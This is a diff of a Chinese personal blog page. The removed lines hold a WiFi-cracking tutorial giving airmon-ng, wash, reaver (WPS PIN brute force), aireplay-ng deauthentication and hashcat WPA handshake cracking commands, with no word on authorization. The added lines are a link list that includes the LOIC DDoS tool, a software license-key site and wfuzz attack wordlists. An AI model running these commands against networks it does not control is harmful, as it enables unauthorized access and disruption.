@@ -4,33 +4,38 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>wifi密码破解 | A1exlism</title>
+    <title>Daily Collection | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="A1ex">
     
 
     
-    <meta name="description" content="WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan0
-出现process占用airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill
-查看wp">
+    <meta name="description" content="DEV快照  IDEA注册码  短网址code-paste  从FE的角度上再看输入url后都发生了什么 
+FunSilk  代码自实现  ChromeGameByAutoThe F12’s Note  
+FunctionProbe实现  Mortenclaussen制图利器ProcessOn  sketchPad
+Linux文件系统FHS
+AndroidXdaXposed)
+Tools&amp;amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wifi密码破解">
-<meta property="og:url" content="http://a1ex.net/11/15/2015/wifiCrack/index.html">
+<meta property="og:title" content="Daily Collection">
+<meta property="og:url" content="http://a1ex.net/04/01/2016/daily-collection/index.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan0
-出现process占用airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill
-查看wp">
-<meta property="og:image" content="http://a1ex.net/imgs/wifiCrack/wps1.png">
-<meta property="og:image" content="http://a1ex.net/imgs/wifiCrack/wps2.png">
-<meta property="og:image" content="http://a1ex.net/imgs/wifiCrack/wps3.png">
-<meta property="og:image" content="http://a1ex.net/imgs/wifiCrack/wps4.png">
-<meta property="og:updated_time" content="2016-02-15T05:40:39.788Z">
+<meta property="og:description" content="DEV快照  IDEA注册码  短网址code-paste  从FE的角度上再看输入url后都发生了什么 
+FunSilk  代码自实现  ChromeGameByAutoThe F12’s Note  
+FunctionProbe实现  Mortenclaussen制图利器ProcessOn  sketchPad
+Linux文件系统FHS
+AndroidXdaXposed)
+Tools&amp;amp;">
+<meta property="og:updated_time" content="2016-04-06T06:15:56.446Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wifi密码破解">
-<meta name="twitter:description" content="WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan0
-出现process占用airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill
-查看wp">
+<meta name="twitter:title" content="Daily Collection">
+<meta name="twitter:description" content="DEV快照  IDEA注册码  短网址code-paste  从FE的角度上再看输入url后都发生了什么 
+FunSilk  代码自实现  ChromeGameByAutoThe F12’s Note  
+FunctionProbe实现  Mortenclaussen制图利器ProcessOn  sketchPad
+Linux文件系统FHS
+AndroidXdaXposed)
+Tools&amp;amp;">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -87,14 +92,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/11/15/2015/wifiCrack/" title="wifi密码破解" itemprop="url">wifi密码破解</a>
+      <a href="/04/01/2016/daily-collection/" title="Daily Collection" itemprop="url">Daily Collection</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-11-14T16:00:00.000Z" itemprop="datePublished"> 发表于 11-15-2015</time>
+    <time datetime="2016-03-31T16:00:00.000Z" itemprop="datePublished"> 发表于 04-01-2016</time>
     
   </p>
 </header>
@@ -103,56 +108,24 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式(monitor)"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference:"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DEV"><span class="toc-number">1.</span> <span class="toc-text">DEV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fun"><span class="toc-number">2.</span> <span class="toc-text">Fun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Function"><span class="toc-number">3.</span> <span class="toc-text">Function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">4.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Android"><span class="toc-number">5.</span> <span class="toc-text">Android</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools&Usage"><span class="toc-number">6.</span> <span class="toc-text">Tools&Usage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebDesign"><span class="toc-number">7.</span> <span class="toc-text">WebDesign</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other’s"><span class="toc-number">8.</span> <span class="toc-text">Other’s</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Videos"><span class="toc-number">9.</span> <span class="toc-text">Videos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#买买买"><span class="toc-number">10.</span> <span class="toc-text">买买买</span></a></li></ol>
 		
 		</div>
 		
-		<h2 id="WPS破解">WPS破解</h2><h3 id="使用网卡混杂模式(monitor)">使用网卡混杂模式(monitor)</h3><p>airmon-ng 查看网卡信息<br>airmon-ng start wlan0<br><img src="/imgs/wifiCrack/wps1.png" alt="1"></p>
-<h4 id="出现process占用">出现process占用</h4><p>airmon-ng check           查看占用进程<br>iwconfig                  查看网卡是否处于monitor状态<br>sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill</p>
-<h3 id="查看wps">查看wps</h3><ol>
-<li><blockquote>
-<p>sudo wash -i wlan0mon -C</p>
-</blockquote>
-</li>
-</ol>
-<p>WPS Locked 为no 即可用wps<br><img src="/imgs/wifiCrack/wps2.png" alt="2"></p>
-<ol>
-<li><blockquote>
-<p>airodump-ng wlan0mon</p>
-</blockquote>
-</li>
-</ol>
-<p>54e.    有点为wps<br>(MB选项的54e.和54e已经不能判断wps了)<br><img src="/imgs/wifiCrack/wps3.png" alt="3"></p>
-<h3 id="破解">破解</h3><p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
-<p>-c    Channel信道 信道可从上面的airodump找出来</p>
-<p><img src="/imgs/wifiCrack/wps4.png" alt="4"></p>
-<p>一般PIN码大概要个12-24小时左右的时间233[如果有60S的防PIN功能]<br>中断重pin的话找到MAC.wpc放入<code>/etc/reaver/</code>或者直接加上-p 前四位pin码就能继续</p>
-<h4 id="问题">问题</h4><p>1.<br>   [+] Sending EAPOL START request<br>  [!] WARNING: Receive timeout occurred<br>  一般是信号太差<br>2.<br>    [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking<br>    一般路由器的防PIN措施,还没碰到网上所说的300s….这个措施保证了PIN的可破解性</p>
-<ol>
-<li><h3 id="存储文件">存储文件</h3><p>Version 1.5     ——/etc/reaver/MAC.wpc<br>Version 1.4     ——/usr/local/etc/reaver/MAC.wpc </p>
-</li>
-</ol>
-<h3 id="重新上网">重新上网</h3><blockquote>
-<p>service network-manager start</p>
-</blockquote>
-<h2 id="关于暴力破解">关于暴力破解</h2><h3 id="抓包">抓包</h3><blockquote>
-<p><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">http://www.secbox.cn/hacker/wireless/4877.html</a></p>
-<ol>
-<li>airodump-ng -w freedom -c CH —bssid  mac地址 wlan0mon —ignore-negative-one<br>CH表示信道，信道是多少就填多少，freedom是一会抓握手包的文件名字，他会自动生成一个freedom.cap的文件，这个名字随便你们填什么</li>
-<li>重新开一个客户端输入命令：<br>aireplay-ng —deaut 10 -a 路由器mac -c 客户端mac wlan0mon —ignore-negative-one</li>
-</ol>
-</blockquote>
-<h3 id="跑包">跑包</h3><p><code>cudaHashcat</code>, advanced password recovery #鉴于windows独立显卡的支持比较好,在windows平台工作非常棒,GPU跑包咻咻咻的快</p>
-<p>下面为常用参数<br>cudaHashcat64.exe —attack-mode 0<br>-m /—hash-type 2500<br>-a / —attack-mode 0<br>–segment-size 3036      内存缓存大小<br>–gpu-loops 1000           Gpu性能<br>–gpu-accel 160              负载优化<br>—increment —increment-min 8 —increment-max 10</p>
-<p>这个是实例 ——   .txt后缀都是密码包,关键还是要看弱密码的数据质量了=, =  跑几个G还是很快的</p>
+		<h2 id="DEV">DEV</h2><p><a href="https://archive.org/web/" target="_blank" rel="external">快照</a>  <a href="http://idea.lanyus.com/" target="_blank" rel="external">IDEA注册码</a>  <a href="http://www.waqiang.com/index.php/url/shorten" target="_blank" rel="external">短网址</a><br><a href="http://paste.ofcode.org/" target="_blank" rel="external">code-paste</a>  <a href="http://div.io/topic/609?page=1" target="_blank" rel="external">从FE的角度上再看输入url后都发生了什么</a> </p>
+<h2 id="Fun">Fun</h2><p><a href="http://weavesilk.com/" target="_blank" rel="external">Silk</a>  <a href="http://codepen.io/jakealbaugh/full/PwLXXP/" target="_blank" rel="external">代码自实现</a>  <a href="http://chirag64.github.io/t-rex-runner-bot/" target="_blank" rel="external">ChromeGameByAuto</a><br><a href="http://tholman.com/dom-animator/" target="_blank" rel="external">The F12’s Note</a>  </p>
+<h2 id="Function">Function</h2><p><a href="http://www.hotcleaner.com/clickclean-app.html" target="_blank" rel="external">Probe实现</a>  <a href="http://www.mortenclaussen.com/" target="_blank" rel="external">Mortenclaussen</a><br><code>制图利器</code><a href="https://www.processon.com/" target="_blank" rel="external">ProcessOn</a>  <a href="https://sketch.io/sketchpad/" target="_blank" rel="external">sketchPad</a></p>
+<h2 id="Linux">Linux</h2><p>文件系统<a href="http://www.pathname.com/fhs/pub/fhs-2.3.html#THEFILESYSTEM" target="_blank" rel="external">FHS</a></p>
+<h2 id="Android">Android</h2><p><a href="http://www.xda-developers.com/" target="_blank" rel="external">Xda</a><br><a href="http://xposed.appkg.com/1051.html" target="_blank" rel="external">Xposed</a>)</p>
+<h2 id="Tools&amp;Usage">Tools&amp;Usage</h2><p>ddos—-<a href="https://github.com/NewEraCracker/LOIC" target="_blank" rel="external">LOIC 低轨道离子炮</a></p>
 <blockquote>
-<p>cudaHashcat64.exe —hash-type 2500 —attack-mode 0  samsing-01.hccap 2(1).txt 2(2).txt 2(3).txt 2(4).txt 2(5).txt 2(6).txt 2(7).txt 2(8).txt 2(9).txt 2(10).txt 2(11).txt 2(12).txt 2(13).txt 2(14).txt 2(15).txt 2(16).txt 2(17).txt 2(18).txt 2(19).txt 2(21).txt 2(22).txt 2(23).txt 2(24).txt 2(25).txt 2(26).txt 2(27).txt 2(28).txt 2(29).txt 2(30).txt 2(31).txt 2(32).txt</p>
+<p>sql xss xml的常用字典(Kali2.0)<br>/usr/share/wfuzz/wordlist</p>
 </blockquote>
-<p>手册(manual)</p>
-<blockquote>
-<p>[hashcat-manual]<a href="https://hashcat.net/wiki/doku.php?id=hashcat" target="_blank" rel="external">https://hashcat.net/wiki/doku.php?id=hashcat</a></p>
-</blockquote>
-<h3 id="Reference:">Reference:</h3><p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="external">airmon-ng</a><br><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a><br><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">51cto</a></p>
+<h2 id="WebDesign">WebDesign</h2><p><a href="https://pages.github.com/" target="_blank" rel="external">Github</a>  <a href="https://www.heroku.com/" target="_blank" rel="external">heroku</a>  <a href="http://lmgtfy.com/?q=let+me+google+that+for+you&amp;l=1" target="_blank" rel="external">lmgtfy</a><br><a href="https://www.qingcloud.com/" target="_blank" rel="external">青云</a>  <a href="https://divshot.com/features" target="_blank" rel="external">divshot</a>  <a href="http://www.andrewmcwatters.com/" target="_blank" rel="external">ACPM</a>  <a href="http://blocsapp.com/" target="_blank" rel="external">Blocs</a><br><a href="http://bootswatch.com/" target="_blank" rel="external">Bootswatch</a>  <a href="http://sweet.2ch.sc/uptime.svg" target="_blank" rel="external">サーバ稼働状況</a>  <a href="https://twentyoverten.com" target="_blank" rel="external">Twenty Over Ten</a><br><a href="http://www.apple.com/" target="_blank" rel="external">Apple</a>  <a href="http://www.lucacasati.net/" target="_blank" rel="external">lucacasati</a>  <a href="http://www.squarespace.com/" target="_blank" rel="external">Build awebsite</a>  <a href="http://union.co/" target="_blank" rel="external">Union</a><br><a href="http://liulanqi.baidu.com/" target="_blank" rel="external">Baidu Browser</a>  </p>
+<h2 id="Other’s">Other’s</h2><p><a href="https://ruby-china.org/topics/17505" target="_blank" rel="external">如何学好一门编程语言技巧方法一粒-译</a></p>
+<hr>
+<h2 id="Videos">Videos</h2><p><a href="www.kaixindy.com">海阔天空</a><br><a href="http://en.savefrom.net/" target="_blank" rel="external">YouTuBe-Download1</a>  <a href="http://vidstatsx.com/" target="_blank" rel="external">YouTuBe-Download2</a>  </p>
+<h2 id="买买买">买买买</h2><p><a href="www.smzdm.com">什么值得买</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -160,7 +133,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://a1ex.net/11/15/2015/wifiCrack/" data-title="wifi密码破解 | A1exlism" data-tsina="null" class="share clearfix">
+	  <div data-url="http://a1ex.net/04/01/2016/daily-collection/" data-title="Daily Collection | A1exlism" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -174,18 +147,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/12/25/2015/Gae-phone/" title="借助GAE实现手机爬梯">
+ <a href="/04/03/2016/linux-optimize/" title="Linux_优化">
   <strong>上一篇：</strong><br/>
   <span>
-  借助GAE实现手机爬梯</span>
+  Linux_优化</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/11/13/2015/book-web安全测试/"  title="读书笔记--web安全测试">
+<a href="/03/28/2016/wireshark-test/"  title="wireshark小记">
  <strong>下一篇：</strong><br/> 
- <span>读书笔记--web安全测试
+ <span>wireshark小记
 </span>
 </a>
 </div>
@@ -194,7 +167,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="11/15/2015/wifiCrack/" data-title="wifi密码破解" data-url="http://a1ex.net/11/15/2015/wifiCrack/"></div>
+	<div class="ds-thread" data-thread-key="04/01/2016/daily-collection/" data-title="Daily Collection" data-url="http://a1ex.net/04/01/2016/daily-collection/"></div>
 </section>
 
 
@@ -204,7 +177,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式(monitor)"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference:"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DEV"><span class="toc-number">1.</span> <span class="toc-text">DEV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fun"><span class="toc-number">2.</span> <span class="toc-text">Fun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Function"><span class="toc-number">3.</span> <span class="toc-text">Function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">4.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Android"><span class="toc-number">5.</span> <span class="toc-text">Android</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools&Usage"><span class="toc-number">6.</span> <span class="toc-text">Tools&Usage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebDesign"><span class="toc-number">7.</span> <span class="toc-text">WebDesign</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other’s"><span class="toc-number">8.</span> <span class="toc-text">Other’s</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Videos"><span class="toc-number">9.</span> <span class="toc-text">Videos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#买买买"><span class="toc-number">10.</span> <span class="toc-text">买买买</span></a></li></ol>
  
   </div>
 
